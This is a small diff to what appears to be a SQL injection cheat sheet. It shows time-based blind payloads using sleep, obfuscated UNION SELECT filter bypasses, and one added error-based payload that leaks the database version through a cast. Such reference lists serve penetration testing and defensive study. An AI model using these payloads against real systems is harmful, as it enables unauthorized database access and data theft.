@@ -49,6 +49,7 @@
   - 0’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
   - 63770’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
   - a%3C%22+UNION+SELECT+SLEEP(20);--+-
+  
   ```
   
 - **PortSwigger SQL Injection Cheat Sheet**:
@@ -152,6 +153,7 @@
   %2f**%2funion%2f**%2fselect%2f**%2f
   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
   /*!UnIoN*/SeLecT+
+  %6c%75%33%6b%79%31%33' AND 1=CAST((SELECT version()) AS int) --
   ```
 
 #### **8. Automated SQL Injection Testing**
